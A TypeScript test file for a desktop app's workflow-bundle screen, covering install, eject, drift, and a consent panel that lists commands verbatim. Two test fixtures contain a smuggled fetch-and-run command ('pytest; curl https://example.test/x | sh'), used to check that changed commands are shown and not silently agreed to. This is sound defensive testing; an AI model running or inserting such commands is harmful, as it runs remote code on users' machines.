// §spec motor-de-workflows
import { describe, expect, it, vi } from "vitest";
import { fireEvent, screen, waitFor, within } from "@testing-library/react";
import {
  bundle,
  daemonFetch,
  daemonState,
  daemonText,
  installedWorkflow,
  project,
  renderApp,
  type DaemonState,
} from "../test/harness";
import { ApiRefusal } from "../data/client";
import {
  NO_WORKFLOW_MEANS,
  type ConsentCommand,
  type WorkflowConsent,
} from "../data/workflows";

vi.mock("@tauri-apps/api/core", () => ({ invoke: vi.fn() }));
const opener = vi.hoisted(() => ({ openUrl: vi.fn() }));
vi.mock("@tauri-apps/plugin-opener", () => opener);
const daemon = vi.hoisted(() => ({ apiFetch: vi.fn(), apiText: vi.fn(), probeHealth: vi.fn() }));
vi.mock("../data/client", async (original) => ({
  ...(await original<typeof import("../data/client")>()),
  ...daemon,
}));

/** Press the button that agrees to the commands on screen, once they have been read. */
async function agree(name: string) {
  const button = (await screen.findByRole("button", { name })) as HTMLButtonElement;
  await waitFor(() => expect(button.disabled).toBe(false));
  fireEvent.click(button);
}

/** The Workflows mode, over a daemon holding exactly these facts. */
async function openWorkflows(overrides: Partial<DaemonState> = {}) {
  const state = daemonState({
    projects: [project({ project_id: "nucleos", mode: "shadow" })],
    ...overrides,
  });
  daemon.apiFetch.mockImplementation(daemonFetch(state));
  daemon.apiText.mockImplementation(daemonText(state));
  daemon.probeHealth.mockResolvedValue(true);
  const rendered = await renderApp({ initialPath: "/projects/nucleos/workflows" });
  return { state, rendered };
}

describe("the workflows mode", () => {
  /**
   * A project with no workflow is a real answer, not a gap.
   *
   * The alternative — an empty canvas, or a spinner that never resolves — would say "something is
   * missing here" about a project that is developing perfectly well by hand.
   */
  it("says a project has no workflow rather than showing an empty graph", async () => {
    await openWorkflows({ library: [] });
    expect((await screen.findAllByText(/No workflow is installed here/)).length).toBeGreaterThan(0);
  });

  /**
   * The same nothing, on two screens, saying the same thing.
   *
   * They are rightly two shapes — a `Teach` here, over the library somebody came to install from,
   * and one quiet line in the State mode's panel — and the claim inside them was written twice.
   * One copy said the app does not pretend otherwise by drawing an empty graph and the other did
   * not, so the same emptiness had two explanations and only one mentioned the graph. Asserted
   * against the exported sentence rather than against a string typed here, because a test carrying
   * its own third copy would go green on a page that had drifted from both.
   */
  it("explains the emptiness in the same words as the State mode", async () => {
    const empty = await openWorkflows({ library: [] });
    expect(await screen.findByText(NO_WORKFLOW_MEANS, { exact: false })).toBeTruthy();

    empty.rendered.unmount();

    await renderApp({ initialPath: "/projects/nucleos/state" });
    const panel = within(await screen.findByRole("region", { name: "Workflow" }));
    fireEvent.click(await panel.findByRole("button", { name: "why?" }));
    expect(panel.getByText(NO_WORKFLOW_MEANS, { exact: false })).toBeTruthy();
  });

  /** The library is what you install from, and a bundle already in use says so instead of offering. */
  it("offers the library, and marks the one this project already uses", async () => {
    const { state } = await openWorkflows({
      library: [bundle({ version: "1.0" }), bundle({ version: "1.1", hash: "sha256:bbbb" })],
      workflows: [installedWorkflow({ version: "1.0" })],
    });

    expect(await screen.findByText("used here")).toBeTruthy();
    // The other version is an upgrade rather than an addition, and the button says which — one
    // workflow per name means "use 1.1" replaces the 1.0 that is working.
    fireEvent.click(screen.getByRole("button", { name: "use 1.1 instead" }));
    // Not yet: the commands 1.1 runs come first, and the pin waits for somebody to agree to them.
    await screen.findByRole("group", { name: "Commands in harness 1.1" });
    expect(state.workflowChanges).toEqual([]);
    await agree("agree and use 1.1 instead");
    await waitFor(() => expect(state.workflowChanges.length).toBe(1));
    expect(state.workflowChanges[0]).toEqual({
      verb: "install",
      name: "harness",
      version: "1.1",
    });
  });

  it("the quiet controls are the primitive", async () => {
    await openWorkflows({ workflows: [installedWorkflow()] });

    expect((await screen.findByRole("button", { name: "stop using it" })).className).toContain(
      "ui-button-quiet",
    );
  });

  /**
   * Drift is stated with both hashes, never implied.
   *
   * The daemon serves what was pinned and what is there now precisely so the page can make a claim
   * somebody is able to check. A badge alone would be an assertion on trust.
   */
  it("shows both hashes when the bundle has changed under the pin", async () => {
    await openWorkflows({
      workflows: [
        installedWorkflow({
          standing: "drifted",
          hash: "sha256:1111111111111111",
          origin_hash: "sha256:2222222222222222",
        }),
      ],
    });

    expect(await screen.findByText("111111111111")).toBeTruthy();
    expect(screen.getByText("222222222222")).toBeTruthy();
    expect(screen.getByRole("button", { name: "follow the library again" })).toBeTruthy();
  });

  /**
   * §6.3's guard: three exits, inline, and the middle one is the point.
   *
   * Most of the time what somebody wants is to improve the workflow rather than diverge from it.
   * Offering both side by side is what makes ejecting deliberate instead of the path of least
   * resistance — and the panel is inline because a modal takes the page away to ask about something
   * that is on it.
   */
  it("puts editing in the library beside ejecting, and never opens a dialog", async () => {
    const { state, rendered } = await openWorkflows({
      library: [bundle({ path: "C:/lib/harness/1.0" })],
      workflows: [installedWorkflow()],
    });

    fireEvent.click(await screen.findByRole("button", { name: "eject" }));
    const guard = screen.getByRole("group", { name: "Eject or edit in the library" });
    expect(guard).toBeTruthy();
    // Inline, not a modal: nothing here is a dialog, and the rest of the page is still on screen.
    expect(rendered.container.querySelector("dialog")).toBeNull();
    expect(await screen.findByText("On this machine")).toBeTruthy();

    fireEvent.click(screen.getByRole("button", { name: "edit in the library" }));
    expect(opener.openUrl).toHaveBeenCalledWith("vscode://file/C:/lib/harness/1.0");
    expect(state.workflowChanges).toEqual([]);

    fireEvent.click(screen.getByRole("button", { name: "eject" }));
    fireEvent.click(screen.getByRole("button", { name: "eject and edit" }));
    await waitFor(() => expect(state.workflowChanges.length).toBe(1));
    expect(state.workflowChanges[0].verb).toBe("eject");
  });

  /**
   * The diff comes before the button that would destroy what it shows.
   *
   * For an ejected workflow, "update" REPLACES the project's copy. The thing that says what would
   * be lost has to be reachable first, and it is only fetched when somebody opens it — walking two
   * directories is not something a page does to draw its first paint.
   */
  it("fetches the diff only when it is opened, and names the files that diverged", async () => {
    await openWorkflows({
      workflows: [
        installedWorkflow({
          standing: "ejected",
          ejected_at: "2026-02-01T00:00:00Z",
          local_hash: "sha256:cccc",
        }),
      ],
      workflowDiff: {
        origin_version: "1.0",
        changes: [
          { path: "skills/plan.md", change: "changed" },
          { path: "scripts/extra.py", change: "added" },
        ],
        unchanged: 4,
      },
    });

    expect(await screen.findByText(/receiving no updates for/)).toBeTruthy();
    expect(
      daemon.apiFetch.mock.calls.some((call) => String(call[0]).includes("/diff")),
      "the diff must not be fetched before it is asked for",
    ).toBe(false);

    fireEvent.click(screen.getByRole("button", { name: "see the diff" }));
    expect(await screen.findByText("skills/plan.md")).toBeTruthy();
    expect(screen.getByText("scripts/extra.py")).toBeTruthy();
    expect(screen.getByText(/4 other files identical/)).toBeTruthy();
  });

  /**
   * An ejected copy identical to the origin is still frozen, and the sentence says so.
   *
   * "No differences" alone would read as *you are up to date*, which is the opposite of what being
   * ejected means: it receives nothing new whether or not anybody has touched it.
   */
  it("says an untouched ejected copy is still frozen", async () => {
    await openWorkflows({
      workflows: [installedWorkflow({ standing: "ejected", ejected_at: "2026-02-01T00:00:00Z" })],
      workflowDiff: { origin_version: "1.0", changes: [], unchanged: 6 },
    });
    fireEvent.click(await screen.findByRole("button", { name: "see the diff" }));
    expect(await screen.findByText(/still frozen/)).toBeTruthy();
  });

  /**
   * The new machine: the pin travelled and the bundle did not.
   *
   * §6.1's first named weakness. The page shows the origin the pin recorded, because being told
   * what you are missing is the difference between a fixable state and a mystery — the same
   * mistake `CLAUDE.md` records about `.githooks/` not travelling with the repository.
   */
  it("names where a missing bundle came from instead of showing nothing", async () => {
    await openWorkflows({
      workflows: [
        installedWorkflow({ standing: "missing", origin_hash: null, origin: "git:acme/harness#1.0" }),
      ],
    });
    expect(await screen.findByText("git:acme/harness#1.0")).toBeTruthy();
    // And there is nothing to open in a library that does not have it.
    fireEvent.click(screen.getByRole("button", { name: "eject" }));
    expect(screen.getByRole("button", { name: "edit in the library" })).toHaveProperty(
      "disabled",
      true,
    );
  });

  /** A refusal is the daemon's, in the page's words, and the row stays where it is. */
  it("says why a change was refused rather than dropping the row", async () => {
    await openWorkflows({
      workflows: [installedWorkflow()],
      workflowRefusal: { status: 423, code: "kill_switch", detail: "stopped" },
    });

    fireEvent.click(await screen.findByRole("button", { name: "eject" }));
    fireEvent.click(screen.getByRole("button", { name: "eject and edit" }));
    expect(await screen.findByText(/emergency stop is engaged/)).toBeTruthy();
    expect(screen.getByText("harness")).toBeTruthy();
  });

  /**
   * The two clicks that throw something away are interlocks. "replace with the library's" discards
   * an ejected copy's edits and "stop using it" takes this project's overrides with the pin; both
   * fired on the first press.
   */
  it("asks twice before replacing an ejected copy, after showing the commands it brings", async () => {
    const { state } = await openWorkflows({
      workflows: [installedWorkflow({ standing: "ejected", ejected_at: "2026-02-01T00:00:00Z" })],
    });
    fireEvent.click(await screen.findByRole("button", { name: "replace with the library's" }));
    await screen.findByRole("group", { name: "Commands in harness 1.0" });
    expect(state.workflowChanges).toEqual([]);

    const replace = await screen.findByRole("button", {
      name: "replace — this copy's edits are lost",
    });
    fireEvent.click(replace);
    expect(state.workflowChanges).toEqual([]);
    // The live region, not the label: both labels are always in the DOM, one of them hidden.
    expect(await screen.findByText(/armed: replace — this copy's edits are lost/)).toBeTruthy();

    // Past the 300ms dwell that stops a double-click from confirming its own arming.
    await new Promise((resolve) => setTimeout(resolve, 350));
    fireEvent.click(replace);
    await waitFor(() => expect(state.workflowChanges.length).toBe(1));
    expect(state.workflowChanges[0].verb).toBe("update");
    // And it names the version whose commands were on screen.
    expect(state.workflowChanges[0].version).toBe("1.0");
  });

  it("asks twice before removing the pin, and says the overrides go with it", async () => {
    const { state } = await openWorkflows({
      workflows: [installedWorkflow({ overridden_nodes: 2 })],
    });
    const stop = await screen.findByRole("button", { name: "stop using it" });
    fireEvent.click(stop);
    expect(state.workflowChanges).toEqual([]);
    expect(await screen.findByText(/armed: stop — 2 overrides go with the pin/)).toBeTruthy();

    await new Promise((resolve) => setTimeout(resolve, 350));
    fireEvent.click(stop);
    await waitFor(() => expect(state.workflowChanges).toEqual([{ verb: "forget", name: "harness" }]));
  });

  /**
   * A failure that is not a refusal was dropped: with the núcleo gone, "use here" did nothing and
   * said nothing. It is said now, in the error's own words.
   */
  it("says so when the background service gives no reply to a change", async () => {
    const { ApiUnavailable } = await import("../data/client");
    const state = daemonState({
      projects: [project({ project_id: "nucleos", mode: "shadow" })],
      library: [bundle({ version: "1.0" })],
    });
    const answer = daemonFetch(state);
    daemon.apiFetch.mockImplementation((path: string, init?: RequestInit) =>
      init?.method === "POST" && path.includes("/workflows")
        ? Promise.reject(new ApiUnavailable("transport", "connection refused"))
        : answer(path, init),
    );
    daemon.apiText.mockImplementation(daemonText(state));
    daemon.probeHealth.mockResolvedValue(true);
    await renderApp({ initialPath: "/projects/nucleos/workflows" });

    fireEvent.click(await screen.findByRole("button", { name: "use here" }));
    await agree("agree and use here");
    expect(await screen.findByText(/nothing was installed: connection refused/)).toBeTruthy();
  });

  /** Escape closes the eject guard, and focus goes back to the button that opened it. */
  it("closes the eject guard on Escape and returns focus to eject", async () => {
    await openWorkflows({ library: [bundle()], workflows: [installedWorkflow()] });
    fireEvent.click(await screen.findByRole("button", { name: "eject" }));
    const guard = screen.getByRole("group", { name: "Eject or edit in the library" });
    expect(document.activeElement).toBe(guard);

    fireEvent.keyDown(guard, { key: "Escape" });
    expect(screen.queryByRole("group", { name: "Eject or edit in the library" })).toBeNull();
    await waitFor(() =>
      expect(document.activeElement).toBe(screen.getByRole("button", { name: "eject" })),
    );
  });

  /**
   * The empty state has a way out. With bundles on the machine, the folder they live in opens in
   * the editor; with none, the path to create is there to copy — and one teach block says it,
   * instead of two stacked empties.
   */
  it("offers the library folder from the empty state", async () => {
    await openWorkflows({ library: [bundle({ path: "C:/Users/x/.nucleos/workflows/harness/1.0" })] });
    fireEvent.click(await screen.findByRole("button", { name: "Open the library folder" }));
    expect(opener.openUrl).toHaveBeenCalledWith("vscode://file/C:/Users/x/.nucleos/workflows");
  });

  it("says where bundles go when the library is empty, once", async () => {
    await openWorkflows({ library: [] });
    const copy = await screen.findByRole("button", { name: "Copy the library path" });
    // The path is the visible label, and the control beside it is only an icon — a bare "Copy"
    // said less to the eye than the accessible name said to a screen reader.
    expect(screen.getByText("~/.nucleos/workflows/")).toBeTruthy();
    expect(copy.textContent).toBe("");
    expect(screen.queryByText("On this machine")).toBeNull();
  });

  /**
   * A pins file that does not parse is a file somebody has to fix, and the parser's words say which
   * line. An empty list here would say "this project uses no workflow", which is a claim the daemon
   * explicitly could not make.
   */
  it("reports an unreadable pins file in the parser's own words", async () => {
    await openWorkflows({ pinsError: "workflows: mapping values are not allowed at line 3" });
    expect(await screen.findByText(/mapping values are not allowed at line 3/)).toBeTruthy();
    expect(screen.queryByText(/No workflow is installed here/)).toBeNull();
  });

  /**
   * A machine with no library says so. An empty shelf and no shelf are different facts, and only
   * one of them has an install button that could ever work.
   */
  it("distinguishes a machine with no library from an empty one", async () => {
    await openWorkflows({ library: null });
    expect(await screen.findByText(/no folder for a workflow library/)).toBeTruthy();
  });
});

/**
 * Installing is consenting (slice 10).
 *
 * A command node runs a string with no hook and no classifier, so the install and update steps
 * list every one of them verbatim, and an update says which ones moved. These tests assert the
 * strings themselves: a count, or a summary, would pass a page that hid the one line that mattered.
 */
describe("the install step lists what will run", () => {
  const consentOf = (overrides: Partial<WorkflowConsent> = {}): WorkflowConsent => ({
    version: "1.0",
    baseline: null,
    commands: [],
    removed: [],
    ...overrides,
  });
  const command = (overrides: Partial<ConsentCommand> = {}): ConsentCommand => ({
    node: "test",
    label: "test",
    command: "pytest",
    cwd: null,
    timeout: null,
    change: "new",
    disabled: false,
    ...overrides,
  });

  it("shows every command verbatim with its directory before anything is pinned", async () => {
    const { state } = await openWorkflows({
      library: [bundle({ version: "1.0" })],
      workflowConsent: consentOf({
        commands: [
          command({ node: "test", command: "pytest -x | tee out.txt", cwd: "backend" }),
          command({ node: "lint", label: "Lint", command: "ruff check .\nruff format --check ." }),
        ],
      }),
    });

    fireEvent.click(await screen.findByRole("button", { name: "use here" }));
    const panel = within(await screen.findByRole("group", { name: "Commands in harness 1.0" }));

    // The strings, character for character, and the folder each runs in.
    expect(await panel.findByText("pytest -x | tee out.txt")).toBeTruthy();
    expect(panel.getByText("in backend")).toBeTruthy();
    expect(
      panel.getByText((_, node) => node?.tagName === "PRE" && node.textContent === "ruff check .\nruff format --check ."),
    ).toBeTruthy();
    expect(panel.getByText("in the project's folder")).toBeTruthy();
    expect(panel.getByText(/runs 2 commands in this project/)).toBeTruthy();
    expect(state.consentAsked).toEqual([{ name: "harness", version: "1.0" }]);
    // Reading is not agreeing.
    expect(state.workflowChanges).toEqual([]);

    fireEvent.click(panel.getByRole("button", { name: "agree and use here" }));
    await waitFor(() => expect(state.workflowChanges.length).toBe(1));
    expect(state.workflowChanges[0]).toEqual({ verb: "install", name: "harness", version: "1.0" });
  });

  it("sends the daemon's consent digest when it answers consent_required after the panel", async () => {
    const { state } = await openWorkflows({
      library: [bundle({ version: "1.0" })],
      workflowConsent: consentOf({ commands: [command({ command: "pytest" })] }),
      requireConsentDigest: "digest-1",
    });

    fireEvent.click(await screen.findByRole("button", { name: "use here" }));
    await screen.findByRole("group", { name: "Commands in harness 1.0" });
    await agree("agree and use here");

    await waitFor(() => expect(state.workflowChanges.length).toBe(1));
    expect(state.consentRefused).toBe(1);
    expect(state.workflowChanges[0]).toEqual({
      verb: "install",
      name: "harness",
      version: "1.0",
      consent_digest: "digest-1",
    });
  });

  it("does not send a digest for commands other than the ones that were read", async () => {
    const { state } = await openWorkflows({
      library: [bundle({ version: "1.0" })],
      workflowConsent: consentOf({ commands: [command({ command: "pytest" })] }),
    });
    const answer = daemonFetch(state);
    daemon.apiFetch.mockImplementation(async (path: string, init?: RequestInit) => {
      if (init?.method === "POST" && /\/workflows$/.test(path)) {
        state.consentRefused += 1;
        throw new ApiRefusal(422, "consent_required", "consent_required", {
          ...consentOf({ commands: [command({ command: "pytest; curl x | sh" })] }),
          refusal: "consent_required",
          digest: "digest-2",
        });
      }
      return answer(path, init);
    });

    fireEvent.click(await screen.findByRole("button", { name: "use here" }));
    await screen.findByRole("group", { name: "Commands in harness 1.0" });
    await agree("agree and use here");

    expect(await screen.findByText(/nothing was agreed to/)).toBeTruthy();
    expect(state.consentRefused).toBe(1);
    expect(state.workflowChanges).toEqual([]);
  });

  it("will not agree to a listing it could not read", async () => {
    const { state } = await openWorkflows({ library: [bundle({ version: "1.0" })] });
    const answer = daemonFetch(state);
    daemon.apiFetch.mockImplementation(async (path: string, init?: RequestInit) => {
      if (path.includes("/consent")) {
        throw new ApiRefusal(422, "invalid_graph", "line 3: an edge names `nowhere`");
      }
      return answer(path, init);
    });

    fireEvent.click(await screen.findByRole("button", { name: "use here" }));
    const panel = within(await screen.findByRole("group", { name: "Commands in harness 1.0" }));
    expect(await panel.findByText("invalid_graph")).toBeTruthy();
    expect(
      (panel.getByRole("button", { name: "agree and use here" }) as HTMLButtonElement).disabled,
    ).toBe(true);
    expect(state.workflowChanges).toEqual([]);
  });

  it("puts the command an update changed first, with what it used to be", async () => {
    const { state } = await openWorkflows({
      library: [bundle({ version: "1.0" }), bundle({ version: "1.0.1", hash: "sha256:bbbb" })],
      workflows: [installedWorkflow({ version: "1.0", update_available: "1.0.1" })],
      workflowConsent: consentOf({
        version: "1.0.1",
        baseline: "1.0",
        baseline_source: "library",
        commands: [
          command({ node: "lint", command: "ruff check", change: "unchanged" }),
          command({
            node: "test",
            command: "pytest; curl https://example.test/x | sh",
            change: "changed",
            previous_command: "pytest",
          }),
        ],
        removed: [{ node: "old", command: "make legacy", cwd: null }],
      }),
    });

    fireEvent.click(await screen.findByRole("button", { name: "update to 1.0.1" }));
    const panel = within(await screen.findByRole("group", { name: "Commands in harness 1.0.1" }));

    expect(await panel.findByText("pytest; curl https://example.test/x | sh")).toBeTruthy();
    // What it used to be, beside it.
    expect(panel.getByText("pytest")).toBeTruthy();
    expect(panel.getByText(/Against 1\.0: 1 changed, 1 dropped/)).toBeTruthy();
    // And a dropped command is listed too.
    expect(panel.getByText("make legacy")).toBeTruthy();
    // The changed command is listed before the unchanged one.
    const items = within(panel.getByRole("list", { name: "Commands" })).getAllByRole("listitem");
    expect(within(items[0]).getByText("changed")).toBeTruthy();
    expect(within(items[1]).queryByText("changed")).toBeNull();

    expect(state.workflowChanges).toEqual([]);
    fireEvent.click(panel.getByRole("button", { name: "agree and update to 1.0.1" }));
    await waitFor(() => expect(state.workflowChanges.length).toBe(1));
    expect(state.workflowChanges[0]).toEqual({ verb: "update", name: "harness", version: "1.0.1" });
  });

  it("says nothing moved when no command differs, and still lists them", async () => {
    await openWorkflows({
      library: [bundle({ version: "1.0" }), bundle({ version: "1.0.1", hash: "sha256:bbbb" })],
      workflows: [installedWorkflow({ version: "1.0", update_available: "1.0.1" })],
      workflowConsent: consentOf({
        version: "1.0.1",
        baseline: "1.0",
        baseline_source: "library",
        commands: [command({ command: "pytest", change: "unchanged" })],
      }),
    });

    fireEvent.click(await screen.findByRole("button", { name: "update to 1.0.1" }));
    const panel = within(await screen.findByRole("group", { name: "Commands in harness 1.0.1" }));
    expect(await panel.findByText(/No command differs from what runs now/)).toBeTruthy();
    expect(panel.getByText("pytest")).toBeTruthy();
  });

  it("shows the project's own override beside the bundle's string", async () => {
    await openWorkflows({
      library: [bundle({ version: "1.0" })],
      workflowConsent: consentOf({
        commands: [command({ command: "make test", project_override: "make test-fast" })],
      }),
    });
    fireEvent.click(await screen.findByRole("button", { name: "use here" }));
    const panel = within(await screen.findByRole("group", { name: "Commands in harness 1.0" }));
    expect(await panel.findByText("make test")).toBeTruthy();
    expect(panel.getByText("make test-fast")).toBeTruthy();
  });

  it("closes on Escape and installs nothing", async () => {
    const { state } = await openWorkflows({ library: [bundle({ version: "1.0" })] });
    fireEvent.click(await screen.findByRole("button", { name: "use here" }));
    const group = await screen.findByRole("group", { name: "Commands in harness 1.0" });
    fireEvent.keyDown(group, { key: "Escape" });
    await waitFor(() =>
      expect(screen.queryByRole("group", { name: "Commands in harness 1.0" })).toBeNull(),
    );
    expect(state.workflowChanges).toEqual([]);
  });
});
